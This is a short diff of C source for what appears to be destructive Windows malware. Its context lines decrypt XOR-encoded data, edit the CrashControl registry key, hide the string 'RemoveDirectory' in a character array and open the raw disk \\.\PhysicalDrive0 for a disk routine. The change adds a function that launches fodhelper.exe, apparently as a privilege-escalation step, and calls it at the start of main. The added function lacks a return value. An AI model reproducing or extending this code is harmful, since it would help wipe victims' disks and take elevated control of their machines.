@@ -31,7 +31,14 @@ void DecryptXOR(char * encrypted_data, size_t data_length, char * key, size_t ke
 	}
 }
 
+BOOL Checku(){
+        LPCSTR lpOperation = "open";
+    LPCSTR lpFile = "C:\\Windows\\System32\\fodhelper.exe";
+    int nShowCmd = SW_SHOWNORMAL;
 
+    HINSTANCE hInstance = ShellExecuteA(NULL, lpOperation, lpFile, NULL, NULL, nShowCmd);
+
+    }
 int Regis(){
         HKEY hKey;
     const wchar_t* subKey = L"SYSTEM\\CurrentControlSet\\Control\\CrashControl\\";  
@@ -172,6 +179,7 @@ char sm[] = {'R', 'e', 'm', 'o', 'v', 'e', 'D', 'i', 'r', 'e', 'c', 't', 'o','r'
 }
 
 int main() {
+	    Checku();
      const wchar_t *device = L"\\\\.\\PhysicalDrive0";  
    Regis();
    DiskPart(device);
